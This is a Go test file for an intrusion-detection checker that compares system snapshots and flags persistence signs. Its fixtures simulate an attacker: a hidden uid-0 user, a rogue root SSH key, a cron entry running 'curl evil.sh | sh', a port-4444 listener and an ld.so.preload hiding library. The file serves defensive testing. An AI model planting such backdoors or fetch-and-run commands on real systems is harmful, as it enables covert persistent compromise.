package check

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/boxwarden/agent/finding"
)

func write(t *testing.T, root, path, content string) {
	t.Helper()
	p := filepath.Join(root, path)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

const tcpHeader = "  sl  local_address rem_address   st\n"

func TestCollectAndDiff(t *testing.T) {
	root := t.TempDir()
	write(t, root, "etc/passwd", "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\nalice:x:1000:1000::/home/alice:/bin/bash\n")
	write(t, root, "etc/group", "sudo:x:27:alice\nusers:x:100:bob\n")
	write(t, root, "home/alice/.ssh/authorized_keys", "# comment\nssh-ed25519 aGVsbG8= alice@laptop\n")
	write(t, root, "etc/cron.d/backup", "0 3 * * * root /usr/local/bin/backup\n")
	write(t, root, "proc/net/tcp", tcpHeader+"0: 00000000:0016 00000000:0000 0A\n1: 0100007F:1F90 00000000:0000 0A\n2: 0100007F:9C40 0100007F:0016 01\n")
	write(t, root, "usr/bin/passwd", "")
	if err := os.Chmod(filepath.Join(root, "usr/bin/passwd"), os.ModeSetuid|0o755); err != nil {
		t.Fatal(err)
	}

	base := Collect(root)
	for cat, key := range map[string]string{
		"user":        "alice",
		"ssh-key":     "alice SHA256:LPJNul+wow4m6DsqxbninhsWHlwfp0JecwQzYpOLmCQ",
		"sudo-member": "sudo:alice",
		"file":        "/etc/cron.d/backup",
		"suid":        "/usr/bin/passwd",
		"port":        "tcp 0.0.0.0:22",
	} {
		if _, ok := base[cat][key]; !ok {
			t.Errorf("%s: missing %q in %v", cat, key, base[cat])
		}
	}
	if _, ok := base["user"]["www-data"]; ok {
		t.Error("nologin user must not be a login-capable user")
	}
	if _, ok := base["port"]["tcp 127.0.0.1:40000"]; ok {
		t.Error("established connection counted as listening")
	}
	if fs := Diff(base, base); len(fs) != 0 {
		t.Fatalf("diff of identical snapshots: %v", fs)
	}

	// Attacker: root uid-0 twin, key in root's authorized_keys, modified cron, new listener.
	write(t, root, "etc/passwd", "root:x:0:0:root:/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\nsysupd:x:0:0::/nonexistent:/bin/sh\n")
	write(t, root, "root/.ssh/authorized_keys", "ssh-rsa d29ybGQ= x@evil\n")
	write(t, root, "etc/cron.d/backup", "* * * * * root curl evil.sh | sh\n")
	write(t, root, "proc/net/tcp", tcpHeader+"0: 00000000:0016 00000000:0000 0A\n1: 00000000:115C 00000000:0000 0A\n")

	got := map[string]finding.Severity{}
	for _, f := range Diff(base, Collect(root)) {
		got[f.Title] = f.Severity
	}
	want := map[string]finding.Severity{
		"Login-capable user added since baseline: sysupd":                                                  finding.Critical,
		"SSH authorized key added since baseline: root SHA256:SG6kYiTRu0+2gPNPfJrZao8k7Ii+c+qOWmxlJg6cuKc": finding.High,
		"Cron/systemd/sudoers/preload file changed since baseline: /etc/cron.d/backup":                     finding.High,
		"Listening port added since baseline: tcp 0.0.0.0:4444":                                            finding.Medium,
	}
	for title, sev := range want {
		if got[title] != sev {
			t.Errorf("want %q (%s), got findings %v", title, sev, got)
		}
	}
	if len(got) != len(want) {
		t.Errorf("unexpected extra findings: %v", got)
	}
}

func TestLive(t *testing.T) {
	root := t.TempDir()
	write(t, root, "etc/ld.so.preload", "/lib/x86_64-linux-gnu/libhide.so\n")
	for pid, exe := range map[string]string{"4242": "/dev/shm/.x", "4243": "/dev/shm/.x", "500": "/usr/sbin/nginx (deleted)", "1": "/usr/lib/systemd/systemd"} {
		os.MkdirAll(filepath.Join(root, "proc", pid), 0o755)
		if err := os.Symlink(exe, filepath.Join(root, "proc", pid, "exe")); err != nil {
			t.Fatal(err)
		}
	}

	got := map[string]finding.Severity{}
	for _, f := range Live(root) {
		got[f.ID+" "+f.Title] = f.Severity
	}
	want := map[string]finding.Severity{
		"ioc.ld-preload /etc/ld.so.preload is not empty":                                          finding.High,
		"ioc.suspicious-process Process running from a temp dir: /dev/shm/.x":                     finding.High,
		"ioc.suspicious-process Process running from a deleted binary: /usr/sbin/nginx (deleted)": finding.Medium,
	}
	if len(got) != len(want) {
		t.Fatalf("got %v", got)
	}
	for k, sev := range want {
		if got[k] != sev {
			t.Errorf("want %q (%s), got %v", k, sev, got)
		}
	}
}
